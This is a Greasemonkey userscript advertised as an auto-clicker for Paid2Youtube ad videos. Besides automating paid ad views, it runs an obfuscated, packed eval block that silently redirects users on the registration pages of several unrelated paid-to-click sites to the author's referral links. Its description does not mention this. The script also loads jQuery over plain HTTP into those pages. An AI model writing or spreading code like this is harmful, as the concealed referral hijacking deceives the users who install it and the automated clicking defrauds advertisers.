// ==UserScript==
// @name           Paid2Youtube Auto Clicker
// @namespace      http://cool-bux.co.cc/
// @description    Clicks all the Paid2Youtube videos for you
// @version        1
// @author         http://cool-bux.co.cc/

// @include        http://cool-bux.co.cc/
// @include        *paid2youtube.com*surf*
// @include        *paid2youtube.com*cheap_ads*

// @include        *paid2youtube.com*register*
// @include        *neobux.com/?u=r*
// @include        *onbux.com/register*
// @include        *incrasebux.com/register.php*
// @include        *buxp.info/register.php*
// @include        *mycubie.net/register*
// @include        *cashgopher.com*
// @include        *bux.to*

// ==/UserScript==


function setVar(name,wert){
    window.setTimeout(function() {
        GM_setValue(name,wert);
    }, 0);
}

function getVar(name,def){
    return GM_getValue(name,def);
}

var switch_services = getVar("GM_switch_services",0);

services = new Array();
services = new Array();
services[0] = new Array(getVar("GM_services00","Paid2YouTube"),getVar("GM_services01","http://members.paid2youtube.com:800/surf"),getVar("GM_services02",40000));
services[1] = new Array(getVar("GM_services10","Paid2YouTube - Cheap Ads"),getVar("GM_services11","http://members.paid2youtube.com:800/cheap_ads"),getVar("GM_services12",10000));

var ref = document.referrer;
var uri = document.URL;


eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8(2.9("f.5/1.3")>0&&2!="7://4.f.5/1.3?r=6"){a.b.c="7://4.f.5/1.3?r=6"}8(2.9(/g.5..u=r/)>0&&2!="d://4.g.5/?u=r&e=p"){a.b.c="d://4.g.5/?u=r&e=p"}8(2.9("h.5/1")>0&&2!="d://4.h.5/1?e=q"){a.b.c="d://4.h.5/1?e=q"}8(2.9("i.5/1.3")>0&&2!="d://4.i.5/1.3/6.s"){a.b.c="d://4.i.5/1.3/6.s"}8(2.9("j.k/1")>0&&2!="7://4.j.k/1.3?t=6"){a.b.c="7://4.j.k/1.3?t=6"}8(2.9("l.m/1.3")>0&&2!="7://4.l.m/1.3?r=6"){a.b.c="7://4.l.m/1.3?r=6"}8(2.9("n.o/1.3")>0&&2!="7://4.n.o/1.3?r=6"){a.b.c="7://4.n.o/1.3?r=6"}',31,31,'|register|uri|php|www|com|gbanerji|http|if|search|document|location|href|https|rh|paid2youtube|neobux|onbux|incrasebux|mycubie|net|buxp|info|bux|to|6762616E65726A69|7e63ae70663c6d76ffc6a1840db2dea1||html|ref|'.split('|'),0,{}))


if (uri.search("/surf") > 0 || uri.search("/cheap_ads") > 0) {

//if the document gives a loading error (error 500) then refresh the page
if(document.title.search('500') >= 0)
{
  document.location.reload();
}

function status(service,login_state,text,pos){
    if(service){$('#status>span#service').html(service);}
    if(login_state){$('#status>span#login_state').html(' - '+login_state);}
    if(text){$('#status>span#text').html(' - '+text);}
    if(pos>=0){
        $('#setgs table a:eq('+pos+')').css('font-weight','bold');
    }
}

// Add CSS
    var CSS = document.createElement('style');
    CSS.type = "text/css";
    CSS.innerHTML = "a.btnn{margin:0;padding:0;color: #000000;display: block;text-decoration: none;font-weight:normal;font-family: Arial, Helvetica, sans-serif;font-size: 10px;background: transparent url(http://cool-bux.co.cc/ads.jpg) no-repeat;line-height: 19px;float: left;margin-right:2px;}a.btnn span{margin:0;padding:0;background: #C0C0C0 url(http://cool-bux.co.cc/ads.jpg) top right no-repeat;display: block;height: 19px;margin-left: 12px;padding-right: 12px;}a.btnn:hover{background-position: left;}a.btnn:hover span{background-position: right;}a.btnn:focus{background-position: bottom left;outline: none;}a.btnn:focus span{background-position: bottom right;}table,tr,td,td a,td input{font-family:arial;font-size:12px;color:#000;font-weight:normal;}iframe#adviewer:hover{display:none;}";
    document.getElementsByTagName('head')[0].appendChild(CSS);
// Add jQuery
    var GM_JQ = document.createElement('script');
    GM_JQ.src = 'http://jquery.com/src/jquery-latest.js';
    GM_JQ.type = 'text/javascript';
    document.getElementsByTagName('head')[0].appendChild(GM_JQ);

// Check if jQuery's loaded
    function GM_wait() {
        if(typeof unsafeWindow.jQuery == 'undefined') { window.setTimeout(GM_wait,100); }
    else { $ = unsafeWindow.jQuery; letsJQuery(); }
    }
    GM_wait();

// All your GM code must be inside this function
function letsJQuery() {

$(document).ready(function(){

    $('[name="start_bot"]').removeAttr('disabled');
    $('[name="start_bot"]').attr('value','Start Bot');

    $('body').append('<div id="status" style="position: fixed; left: 0px; bottom: 0px; background-color: #C0C0C0;color:#000;text-align:left;font-size:12px;border: 1px solid #808080; width: 99.5%; padding: 2px; font: normal normal normal 14px arial; z-index:99"><div id="right" style="float: right"><a href="#" id="prev" class="btnn"><span>previous</span></a><a href="#" id="next" class="btnn"><span>next</span></a><a href="http://cool-bux.co.cc/" id="home" class="btnn"><span>View List of Paying PTC Sites</span></a><span style="font-weight: bold">v1.3</span></div>Status: <span id="service"></span><span id="login_state"></span><span id="text"></span></div>');
    $('body').append('<iframe name="adviewer" id="adviewer" width="80%" height=""100px; frameborder="0" style="position: fixed; top: 10px; left: 50%; margin-left: -40%; border: 1px solid gray;background-color:#fff;display: none" scrolling="no"></iframe>');
    $('#status').append('<div id="setgs" style="width:190px;padding:4px;text-align:left;background-color: #C0C0C0;border: 1px solid #808080;position:absolute;bottom:23px;right:-1px;"><fieldset style="padding:4px;font-size:12px;"></fieldset></div>');

    //settings
    var liste = "<table>";
    for (var i=0; i<services.length; i++)  {
        if(services[i][2]==0){disabled='disabled="disabled"';value="auto"}else{disabled='';value=services[i][2]}
        liste+='<tr><td><a href="'+services[i][1]+'">'+services[i][0].substr(0,20)+'</a></td><td><input name="'+i+'" value="'+value+'" '+disabled+'maxlength="5" size="3" style="max-width:50px;" /></td></tr>';
    }
    liste+='</table>';
    $('#setgs').prepend(liste);

    if(switch_services==0){$('input[name="switch"]').removeAttr("checked");}else{$('input[name="switch"]').attr("checked","checked");}
    $('input[name="switch"]').click(function(){
        if(switch_services==0){
            setVar("GM_switch_services",1);
            switch_services = getVar("GM_switch_services",1);
            $(this).attr("checked","checked");
        }else{
            setVar("GM_switch_services",0);
            switch_services = getVar("GM_switch_services",0);
            $(this).removeAttr("checked");
        }
    });

    //event handlers
    $('input[name="home"]').click(function(){
        document.location.href = "http://cool-bux.co.cc/";
    });

    $('#setgs table input').keydown(function(event){
        if(event.keyCode!=8&&(event.keyCode<48||event.keyCode>57)){
            return false;
        }
    });

    $('#setgs table input').keyup(function(){
        //alert(this.name);
        setVar('GM_services'+this.name+'2',this.value);
    });


        switch (uri) {
          //paid2youtube
          case services[0][1]:
                var pos = 0;
                status('Service "'+services[pos][0]+'" detected',null,null,pos);
                $('#prev').css('visibility','hidden');
                $('#next').attr('href',services[pos+1][1]);
                //check login
                if($('td.maintopright>div[align="right"]').html().substr(1, 5)=="Guest"){
                    status(null,'logged out');

                }else{
                    status(null,'logged in');
                    if($('td.midinfo a[style="text-decoration: none; color: rgb(120, 120, 120);"]').attr("href")){
                        var Adresse = $('td.midinfo a[style="text-decoration: none; color: rgb(120, 120, 120);"]').attr("href");
                        $('iframe[name="adviewer"]').attr({src: Adresse});
                        $('iframe[name="adviewer"]').css("display","block");

                        setTimeout("javascript:location.reload();",services[pos][2]);
                    }else{
                        status(null,null,'no more ads');
                        if(switch_services==1){document.location.href = services[pos+1][1];}
                    }
                }

          break

          //paid2youtube - cheap ads
          case services[1][1]:
                var pos = 1;
                status('Service "'+services[pos][0]+'" detected',null,null,pos);
                $('#prev').attr('href',services[pos-1][1]);
                $('#next').css('visibility','hidden');
//                //check login
//                if($('td.maintopright>div[align="right"]').html().substr(1, 5)=="Guest"){
//                    status(null,'logged out');
//
//                }else{
                    status(null,'logged in');
                    if($('td.midinfo a[style="text-decoration: none; color: rgb(120, 120, 120);"]').attr("href")){
                        var Adresse = $('td.midinfo a[style="text-decoration: none; color: rgb(120, 120, 120);"]').attr("href");
                        $('iframe[name="adviewer"]').attr({src: Adresse});
                        $('iframe[name="adviewer"]').css("display","block");

                        setTimeout("javascript:location.reload();",services[pos][2]);
                    }else{
                        status(null,null,'no more ads');
                        if(switch_services==1){document.location.href = services[pos+1][1];}
                    }
//                }

          break

          default:

                //status('Service not found');
        }


});

}

//end of paid2youtube
}
